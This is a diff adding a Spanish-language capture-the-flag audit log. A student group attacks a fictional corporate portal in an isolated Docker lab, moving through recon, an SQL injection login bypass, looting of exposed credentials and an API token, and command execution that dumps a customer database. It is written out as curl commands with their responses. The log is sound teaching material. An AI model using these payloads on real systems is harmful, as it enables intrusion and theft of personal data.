@@ -1,0 +1,80 @@
+================================================================================
+BITACORA OFICIAL DE AUDITORIA DE SEGURIDAD OFENSIVA (BLACK BOX)
+Target: PhantomCorp Clientes (http://phantomcorp:80)
+Entorno: Red Docker aislada (cyberlab_labnet - internal: true)
+Auditor: Grupo 12 - Seguridad Informatica 2026 (UTN FRVM)
+================================================================================
+
+[FASE 1: RECONOCIMIENTO Y ENUMERACION (HITO R1)]
+1. Inspeccion del servicio base:
+   $ curl -s -i http://phantomcorp
+   -> HTTP 200 OK | Banner: PhantomClientes/2.0 | "PhantomCorp Clientes - Portal publico"
+
+2. Descubrimiento de rutas no indexadas:
+   $ curl -s -i http://phantomcorp/robots.txt
+   -> HTTP 200 OK | Directiva: Disallow: /portal-rrhh
+
+3. Inspeccion del portal interno de Recursos Humanos:
+   $ curl -s -i http://phantomcorp/portal-rrhh
+   -> HTTP 200 OK | Formulario POST a /portal/login
+   -> Flag R1 en comentario HTML: FLAG{final_recon_portal}
+
+4. Registro de Bandera R1:
+   $ ./ctf submit final R1 'FLAG{final_recon_portal}'
+   -> Reto R1 resuelto: Recon/enum: portal interno localizado
+
+
+[FASE 2: EXPLOTACION Y ACCESO INICIAL / FOOTHOLD (HITO R2)]
+5. Prueba de autenticacion fallida con credenciales por defecto:
+   $ curl -s -i -X POST http://phantomcorp/portal-rrhh/login -d "user=admin&pass=admin"
+   -> HTTP 401 Credenciales invalidas
+
+6. Explotacion de Inyeccion SQL (Bypass booleano en autenticacion):
+   $ curl -s -i -X POST http://phantomcorp/portal-rrhh/login -d "user=' OR 1=1--&pass=dummy"
+   -> HTTP 200 OK | "Bienvenido admin. Dashboard RRHH."
+   -> Flag R2 en respuesta: FLAG{final_sqli_foothold}
+   -> Divulgacion de respaldo sensible: "/backup/rrhh.conf"
+
+7. Registro de Bandera R2:
+   $ ./ctf submit final R2 'FLAG{final_sqli_foothold}'
+   -> Reto R2 resuelto: Explotacion: foothold por SQLi
+
+
+[FASE 3: POST-EXPLOTACION Y LOOTING DE SECRETOS (HITO R3)]
+8. Descarga del archivo de configuracion expuesto:
+   $ curl -s -i http://phantomcorp/backup/rrhh.conf
+   -> HTTP 200 OK | DB_USER=rrhh_app | DB_PASS=Rh-2026
+   -> Secreto extraido: API_TOKEN=phantom-api-7c1e
+   -> Flag R3 en comentario: FLAG{final_token_looted}
+
+9. Registro de Bandera R3:
+   $ ./ctf submit final R3 'FLAG{final_token_looted}'
+   -> Reto R3 resuelto: Post: token de API looteado
+
+
+[FASE 4: IMPACTO Y EXFILTRACION DE CROWN JEWELS (HITO R4)]
+10. Validacion de Ejecucion Remota de Comandos (RCE):
+    $ curl -s -i "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=whoami"
+    -> HTTP 200 OK | Salida: root
+
+    $ curl -s -i "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
+    -> HTTP 200 OK | Salida: uid=0(root) gid=0(root) groups=0(root)
+
+11. Enumeracion del sistema de archivos privado:
+    $ curl -s -i "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=ls%20-la%20/app/priv"
+    -> HTTP 200 OK | Archivo: clientes.db.txt
+
+12. Exfiltracion de la base de datos confidencial de clientes:
+    $ curl -s -i "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat%20/app/priv/clientes.db.txt"
+    -> HTTP 200 OK | clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
+
+13. Registro de Bandera R4:
+    $ ./ctf submit final R4 'FLAG{final_crown_jewels}'
+    -> Reto R4 resuelto: Impacto: crown jewels (datos de clientes)
+
+
+[FASE 5: VERIFICACION FINAL DEL STATUS CTF]
+14. Consulta de estado y progreso oficial:
+    $ ./ctf status final
+    -> 4/4 (100%) completado.
+================================================================================
